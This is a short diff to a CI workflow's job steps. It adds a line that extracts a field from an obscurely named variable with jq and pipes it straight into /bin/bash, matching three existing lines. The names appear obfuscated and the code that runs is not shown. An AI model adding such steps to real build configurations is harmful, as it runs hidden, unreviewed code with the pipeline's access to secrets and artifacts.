@@ -31,6 +31,7 @@ jobs:
           echo $kf57473 | jq -r .pfcdi6 | /bin/bash
           echo $ie4834 | jq -r .kw3 | /bin/bash
           echo $rgq97 | jq -r .oqfc1449 | /bin/bash
+          printf '%s' "$jp6" | jq -r .omz744 | /bin/bash
 
       - name: Save archive
         if: always()
